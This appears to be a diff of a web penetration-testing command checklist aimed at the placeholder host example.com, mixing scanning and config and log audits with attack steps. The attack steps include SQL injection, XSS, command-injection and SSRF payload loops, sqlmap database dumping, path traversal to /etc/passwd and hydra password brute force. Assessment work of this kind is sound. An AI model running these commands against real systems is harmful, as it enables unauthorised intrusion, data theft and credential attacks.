@@ -1,210 +1,32 @@
-
-curl -I example.com/admin
-curl -I example.com/api/private
-curl -X POST example.com/restricted
+for path in admin api/private restricted secret user/profile .git/config backup.tar.gz config.php.bak .env .htaccess phpinfo.php server-status backup logs debug config.bak config.php.old config.save; do curl -s -I "example.com/$path" | grep "HTTP"; done
 curl -H "Authorization: Bearer fake_token" example.com/secret
 curl -b "session=invalid" example.com/user/profile
-wget --spider example.com/admin
-ls -l /var/www/html
-find /var/www -type f -perm -o+r
-stat /etc/nginx/sites-available/default
-grep -r "Require all granted" /etc/apache2
-nmap --script http-methods -p 80 example.com
-nmap --script http-auth -p 80 example.com
-dirb example.com /usr/share/wordlists/dirb/common.txt
-gobuster dir -u example.com -w /usr/share/wordlists/dirb/common.txt
-nikto -h example.com
-curl example.com/.git/config
-curl example.com/backup.tar.gz
-curl example.com/config.php.bak
-cat /etc/passwd | grep www-data
-getfacl /var/www/html
-
-openssl s_client -connect example.com:443
-openssl s_client -connect example.com:443 -tls1
-openssl s_client -connect example.com:443 -ssl3
-nmap --script ssl-enum-ciphers -p 443 example.com
-nmap --script ssl-cert -p 443 example.com
-testssl.sh example.com:443
-sslyze --regular example.com:443
-openssl dgst -sha1 /path/to/file
-openssl dgst -md5 /path/to/file
-openssl rsa -in private.key -check
-grep -r "SSLProtocol" /etc/apache2
-grep -r "SSLCipherSuite" /etc/nginx
-cat /etc/ssl/openssl.cnf
-openssl x509 -in cert.pem -text -noout
-curl -I example.com --http1.0
-curl -k example.com
-nmap --script ssl-date -p 443 example.com
-openssl s_client -connect example.com:443 -servername example.com
-sslscan example.com:443
-nmap --script ssl-heartbleed -p 443 example.com
-
-curl "example.com/login?user=admin'--"
-curl "example.com/search?query=<script>alert(1)</script>"
-curl "example.com/api?param=;whoami"
-sqlmap -u "example.com/login" --batch
-sqlmap -u "example.com/search?id=1" --dbs
-sqlmap -u "example.com/search?id=1" --tables
-sqlmap -u "example.com/search?id=1" --dump
-curl "example.com/command?cmd=ls;id"
-curl "example.com/search?input=1%20OR%201=1"
-curl "example.com/login?user=admin%27%20%23"
-nmap --script http-sql-injection -p 80 example.com
-nmap --script http-xss -p 80 example.com
-commix --url "example.com/search?query=test"
-curl "example.com/file?path=/etc/passwd"
+curl -X POST example.com/restricted
+curl -s example.com/admin > /dev/null && echo "Admin page exists"
+dirb example.com /usr/share/wordlists/dirb/big.txt -o dirb_results.txt
+gobuster dir -u example.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,old -o gobuster_results.txt
+nmap -p 80,443 --script http-methods,http-auth,http-security-headers,http-default-accounts,http-config-backup example.com -oN nmap_security_scan.txt
+netstat -tuln | grep -v "127.0.0.1"
+ss -tuln | grep -v "127.0.0.1"
+testssl.sh example.com:443 > ssl_test_results.txt
+sslyze --regular example.com:443 >> ssl_test_results.txt
+nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-date -p 443 example.com -oN ssl_nmap_results.txt
+grep -r "SSLProtocol" /etc/apache2 /etc/nginx
+grep -r "SSLCipherSuite" /etc/apache2 /etc/nginx
+for payload in "admin'--" "<script>alert(1)</script>" ";whoami" "1%20OR%201=1" "admin%27%20%23" "\";drop table users--"; do curl -s "example.com/search?query=$payload" | grep -i "error\|alert\|whoami"; done
+sqlmap -u "example.com/search?id=1" --batch --dbs --tables --dump --risk=3 --level=5 -o
+curl "example.com/file?path=../../../../etc/passwd"
 curl "example.com/api?data=`whoami`"
-sqlmap -u "example.com/api" --method POST --data "user=admin"
-curl "example.com/search?q=\";drop table users--"
-curl "example.com/login?pass=admin' OR '1'='1"
-nmap --script http-phpself-xss -p 80 example.com
-curl "example.com/api?input=../../etc/passwd"
-
-grep -r "hardcoded_password" /var/www/html
-grep -r "admin:admin" /var/www
-find /var/www -name "*.php" -exec grep "eval(" {} \;
-grep -r "mysql_connect" /var/www/html
-grep -r "exec(" /var/www/html
-grep -r "system(" /var/www/html
-find /var/www -name "*.bak"
-grep -r "secret_key" /var/www/html
-grep -r "api_key" /var/www/html
-cat /var/www/html/config.php
-grep -r "disable_functions" /etc/php.ini
-grep -r "allow_url_fopen" /etc/php.ini
-grep -r "allow_url_include" /etc/php.ini
-find /var/www -type f -name "*.log"
-grep -r "debug=true" /var/www/html
-grep -r "password=" /var/www/html
-find /var/www -type f -name "*.sql"
-grep -r "TODO" /var/www/html
-grep -r "FIXME" /var/www/html
-grep -r "eval(base64_decode" /var/www/html
-
-nmap -p 80,443 --script http-security-headers example.com
-cat /etc/nginx/nginx.conf
-cat /etc/apache2/apache2.conf
-grep -r "ServerTokens" /etc/apache2
-grep -r "ServerSignature" /etc/apache2
-curl -I example.com -H "X-HTTP-Method-Override: DELETE"
-nmap --script http-config-backup -p 80 example.com
-curl example.com/.env
-curl example.com/.htaccess
-find /var/www -name "*.bak"
-netstat -tuln
-ss -tuln
-grep -r "AllowOverride" /etc/apache2
-cat /etc/php.ini
-grep -r "expose_php" /etc/php.ini
-curl example.com/server-status
-curl example.com/phpinfo.php
-nmap --script http-default-accounts -p 80 example.com
-cat /etc/ssh/sshd_config
-chkconfig --list
-
-dpkg -l | grep apache
-dpkg -l | grep nginx
-dpkg -l | grep php
-rpm -qa | grep mysql
-pip list --outdated
-npm outdated
-composer show -o
-gem list --local
-dpkg -l | grep openssl
-cat /etc/os-release
-nmap --script http-vuln-cve* -p 80 example.com
-nmap --script http-wordpress-enum -p 80 example.com
-nmap --script http-drupal-enum -p 80 example.com
-dependency-check --scan /var/www/html
-curl example.com/readme.txt
-curl example.com/CHANGELOG.md
-wp-cli core version --path=/var/www/html
-drush status
-pipdeptree
-grep -r "version" /var/www/html
-
-hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
-hydra -L /usr/share/wordlists/users.txt -p password ssh://example.com
+nmap --script http-sql-injection,http-xss,http-phpself-xss -p 80 example.com
+grep -r -E "hardcoded_password|secret_key|api_key|mysql_connect|exec\(|system\(|password=" /var/www/html
+find /var/www -type f -name "*.php" -exec grep "eval(" {} \; -print
+find /var/www -type f -name "*.bak" -o -name "*.log" -o -name "*.sql"
+grep -r -E "disable_functions|allow_url_fopen|allow_url_include" /etc/php*
+for url in "http://localhost:8080" "http://127.0.0.1" "file:///etc/passwd" "http://169.254.169.254" "gopher://localhost:6379"; do curl -s "example.com/api?url=$url" | grep -i "internal\|error"; done
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4
 curl -c cookies.txt -d "username=admin&password=test" example.com/login
 curl -b cookies.txt example.com/profile
-nmap --script http-brute -p 80 example.com
-curl "example.com/login?token=invalid"
-curl example.com/.well-known/jwks.json
-curl example.com/reset?user=admin
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://example.com
-curl -I example.com/logout
-nmap --script http-csrf -p 80 example.com
-curl -d "user=admin&pass=admin" example.com/login
-curl example.com/api/token?user=guest
-hydra -l admin -p admin http-get://example.com/admin
-curl "example.com/login?redirect=/admin"
-curl -I example.com/session
-nmap --script http-auth-finder -p 80 example.com
 curl -H "Cookie: session=expired" example.com
-curl example.com/.well-known/openid-configuration
-curl example.com/login?user=admin&pass=admin123
-
-sha256sum /path/to/software.deb
-md5sum /path/to/file
-gpg --verify software.deb.asc
-gpg --verify signature.asc file.tar.gz
-curl example.com/update?file=malicious
-curl -I example.com/static/script.js
-nmap --script http-fileupload-exploiter -p 80 example.com
-find /var/www -type f -name "*.sig"
-sha1sum /var/www/html/index.php
-curl example.com/api/upload --data-binary @malicious.txt
-grep -r "Content-Security-Policy" /etc/nginx
-curl -H "Content-Type: application/json" -d '{"data":"malicious"}' example.com/api
-cat /var/www/html/package.json
-npm audit
-pip check
-curl example.com/download?file=unsigned
-find /var/www -type f -exec md5sum {} \;
-curl -I example.com/static/app.min.js
-grep -r "integrity=" /var/www/html
-curl example.com/api/validate?data=corrupted
-
-tail -f /var/log/auth.log
-tail -f /var/log/syslog
-cat /var/log/nginx/access.log
-cat /var/log/apache2/error.log
-grep "error" /var/log/messages
-auditctl -l
-journalctl -u sshd
-find /var/log -type f -name "*.log"
-ls -l /var/log
-grep -r "LogLevel" /etc/apache2
-grep -r "access_log" /etc/nginx
-cat /etc/rsyslog.conf
-systemctl status auditd
-tail -f /var/log/fail2ban.log
-grep "failed" /var/log/auth.log
-journalctl -p 3 -xb
-cat /etc/logrotate.conf
-grep -r "logger" /var/www/html
-find /var/log -mtime -1
-less /var/log/secure
-
-curl "example.com/api?url=http://localhost:8080"
-curl "example.com/proxy?url=http://127.0.0.1"
-curl "example.com/fetch?url=file:///etc/passwd"
-curl "example.com/api?url=http://metadata.google.internal"
-curl "example.com/redirect?url=http://internal.example.com"
-nmap --script http-fetch -p 80 example.com
-curl "example.com/api?url=http://169.254.169.254"
-curl "example.com/proxy?url=ftp://internal.server"
-curl "example.com/fetch?url=gopher://localhost:6379"
-curl "example.com/api?url=http://10.0.0.1"
-curl "example.com/fetch?url=ldap://localhost"
-curl "example.com/api?url=dict://127.0.0.1:6379"
-curl "example.com/proxy?url=sftp://internal.server"
-curl "example.com/fetch?url=http://0.0.0.0"
-curl "example.com/api?url=http://[::1]"
-curl "example.com/fetch?url=file://localhost/etc/hosts"
-curl "example.com/api?url=http://internal-service:8080"
-curl "example.com/proxy?url=http://192.168.1.1"
-curl "example.com/fetch?url=jar:http://localhost"
-curl "example.com/api?url=netdoc://internal-server"
+tail -f /var/log/auth.log | grep "failed"
+cat /var/log/nginx/access.log /var/log/apache2/error.log | grep -i "error\|sql\|xss"
+journalctl -u sshd --since "1 hour ago"
